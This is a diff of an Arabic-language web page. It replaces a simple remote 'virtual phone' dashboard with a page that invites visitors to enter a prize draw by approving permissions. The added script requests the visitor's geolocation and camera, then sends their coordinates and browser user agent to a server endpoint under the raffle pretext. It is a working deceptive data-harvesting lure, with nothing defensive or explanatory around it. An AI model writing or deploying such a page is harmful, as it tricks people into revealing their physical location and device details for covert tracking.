@@ -1,72 +1,33 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>لوحة التحكم والهاتف</title>
-    <style>
-        body { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #222; font-family: sans-serif; margin: 0; }
-        .dashboard { width: 400px; padding: 20px; background-color: white; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; }
-        .control-panel, .link-panel { margin-top: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 10px; }
-        .phone { width: 250px; height: 500px; background-color: #fff; border-radius: 30px; border: 8px solid #000; padding: 20px; text-align: center; margin-top: 20px; transition: 0.5s; }
-        button { padding: 10px 20px; margin: 5px; cursor: pointer; border: none; border-radius: 5px; background-color: #007bff; color: white; font-size: 16px; }
-        button.off { background-color: #6c757d; }
-        input { width: 70%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
-    </style>
-</head>
 <body>
-
-    <div class="dashboard">
-        <h2>لوحة التحكم</h2>
-        
-        <div class="phone">
-            <h3>الهاتف الافتراضي</h3>
-            <p id="phone-status">الحالة: جاري التحميل...</p>
-        </div>
-
-        <div class="control-panel">
-            <h4>التحكم به عن بعد</h4>
-            <button onclick="setStatus('مفتوح')">تشغيل الهاتف</button>
-            <button class="off" onclick="setStatus('مغلق')">إغلاق الهاتف</button>
-        </div>
-
-        <div class="link-panel">
-            <h4>رابط الاتصال</h4>
-            <input type="text" id="linkBox" readonly style="width: 80%;">
-            <button onclick="copyLink()">نسخ الرابط</button>
-        </div>
-    </div>
+    <h1>للمشاركة في السحب، يرجى الموافقة على الأذونات</h1>
+    <button id="start-btn">ابدأ المشاركة</button>
 
     <script>
-        // إظهار رابط الموقع في المربع
-        document.getElementById('linkBox').value = window.location.origin;
+        document.getElementById('start-btn').addEventListener('click', async () => {
+            // 1. طلب الموقع الجغرافي
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
 
-        // دالة نسخ الرابط
-        function copyLink() {
-            const copyText = document.getElementById("linkBox");
-            copyText.select();
-            document.execCommand("copy");
-            alert("تم نسخ الرابط!");
-        }
-
-        // دالة تغيير الحالة (إرسال POST للسيرفر)
-        async function setStatus(status) {
-            await fetch('/api/set', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ status: status })
-            });
-            alert("تم تغيير الحالة إلى: " + status);
-        }
-
-        // تحديث حالة الهاتف تلقائياً كل ثانية لرؤية التغييرات
-        setInterval(async () => {
-            const res = await fetch('/api/status');
-            const data = await res.json();
-            const phone = document.querySelector('.phone');
-            const statusText = document.getElementById('phone-status');
-            statusText.innerText = "الحالة: " + (data.status === 'مفتوح' ? 'الهاتف يعمل' : 'الهاتف مغلق');
-            phone.style.background = data.status === 'مفتوح' ? '#7cfc00' : 'white';
-        }, 1000);
+                // 2. طلب الكاميرا (سيظهر للمستخدم نافذة الموافقة)
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    // إرسال البيانات للسيرفر
+                    await fetch('/api/submit-data', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            location: location,
+                            deviceInfo: navigator.userAgent
+                        })
+                    });
+                    alert("تم إرسال البيانات بنجاح!");
+                } catch (err) {
+                    alert("خطأ: يرجى السماح بالوصول للكاميرا للمتابعة.");
+                }
+            }, () => alert("خطأ: يرجى السماح بالوصول للموقع."));
+        });
     </script>
 </body>
 </html>
